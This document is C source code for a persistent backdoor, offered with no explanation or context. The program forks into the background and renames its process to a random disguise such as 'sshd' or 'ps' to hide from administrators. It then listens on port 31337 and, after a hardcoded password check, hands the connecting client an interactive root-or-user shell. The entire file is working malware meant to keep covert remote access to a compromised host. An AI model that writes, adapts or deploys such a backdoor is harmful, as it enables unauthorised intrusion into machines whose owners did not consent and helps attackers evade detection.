#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/socket.h> 
 
#define BUFSIZ  256
 
 
int main(int argc,char *argv[]){
        int insock,s,port=31337;
        char pass[BUFSIZ+2]="foo";
        ssize_t size;
        struct sockaddr_in servaddr,cliaddr;
        unsigned int len;
        char *newname;
 
 
        if(fork()!=0)
                return 0;
 
        srand(time(NULL));
        switch(rand()%4) {
        case 0:
                newname="sshd";
                break;
        case 1:
                newname="-bash";
                break;
        case 2:
                newname="sh";
                break;
        case 3:
                newname="ps";
        }
 
        memset(argv[0],0,strlen(argv[0]));
        strcpy(argv[0],newname);/*changeprocessname*/
        close(0);
        close(1);
        close(2);
        servaddr.sin_family=AF_INET;
        servaddr.sin_port=htons(port);
        servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
 
        s=socket(AF_INET,SOCK_STREAM,0);
        bind(s,(struct sockaddr*)&servaddr,sizeof(servaddr));
        listen(s,10);
 
        for(;;) {
                len=sizeof(cliaddr);
                insock=accept(s,(struct sockaddr*)&cliaddr,&len);
                if(fork()==0) {
                        char buf[BUFSIZ+2]={};
                        send(insock,"pass?",6,0);
                        size=recv(insock,&buf,BUFSIZ,0);
                        if(strncmp(buf,pass,strlen(pass))) {
                                send(insock,"WRONG!\n",8,0);
                                close(insock);
                                exit(0);
                        }
                        dup2(insock,0);
                        dup2(insock,1);
                        dup2(insock,2);
                        execl("/bin/sh","sh","-i",(char*)0);
                        close(insock);
                        exit(-1); /* should not reach this point */
                }
        }
}